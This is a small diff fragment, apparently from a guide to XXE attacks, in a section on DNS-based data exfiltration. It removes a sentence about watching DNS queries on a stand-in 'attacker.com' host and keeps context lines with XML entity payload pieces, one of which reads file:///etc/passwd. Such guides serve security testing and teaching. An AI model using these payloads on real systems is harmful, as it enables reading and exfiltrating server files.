@@ -1430,7 +1430,7 @@ When HTTP/HTTPS connections are blocked by firewall rules, DNS exfiltration prov
 %exfiltrate;
 ```
 
-Monitor DNS queries on `attacker.com` to capture data. Tools like `dnsdumpster` or custom DNS servers can log the queries. Services like **Interactsh** also provide automatic DNS logging:
+Services like **Interactsh** provide automatic DNS logging:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
